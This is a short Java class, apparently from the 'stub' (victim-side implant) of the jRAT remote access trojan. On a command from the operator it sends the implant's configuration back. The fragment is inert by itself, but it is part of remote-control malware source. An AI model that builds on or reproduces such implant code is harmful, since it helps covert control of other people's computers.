package io.jrat.stub.packets.incoming;

import io.jrat.stub.Configuration;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet66Config;

public class Packet88StubConfig extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.addToSendQueue(new Packet66Config(Configuration.getConfig()));
	}

}
